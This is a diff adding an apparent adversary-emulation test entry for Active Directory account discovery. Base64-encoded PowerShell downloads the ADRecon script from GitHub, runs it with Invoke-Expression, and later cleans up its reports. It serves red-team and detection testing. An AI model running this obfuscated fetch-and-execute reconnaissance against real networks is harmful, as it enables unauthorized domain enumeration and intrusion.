@@ -1,0 +1,20 @@
+- id: 60559b1a-e0ca-587e-98f4-efa70d4f34c5
+  name: Soumaia ART Tests - Automated AD Recon (ADRecon)
+  description: 'ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its
+
+    path will be displayed.'
+  tactic: discovery
+  technique:
+    attack_id: T1087.002
+    name: 'Account Discovery: Domain Account'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABBAEQAUgBlAGMAbwBuAC4AcABzADEAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBzAGUAbgBzAGUALQBvAGYALQBzAGUAYwB1AHIAaQB0AHkALwBBAEQAUgBlAGMAbwBuAC8AMwA4AGUANABhAGIAYQBlADMAZQAyADYAZAAwAGYAYQA4ADcAMgA4ADEAYwAxAGQAMABjADYANQBjAGEAYgBkADQAZAAzAGMANgBlAGIAZAAvAEEARABSAGUAYwBvAG4ALgBwAHMAMQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAEEARABSAGUAYwBvAG4ALgBwAHMAMQAiAAoA
+          }
+          Invoke-Expression "$env:TEMP\ART-ExternalPayloads\ADRecon.ps1"
+        cleanup: |-
+          Get-ChildItem "$env:TEMP\ART-ExternalPayloads" -Recurse -Force | Where{$_.Name -Match "^ADRecon-Report-"} | Remove-Item -Force -Recurse
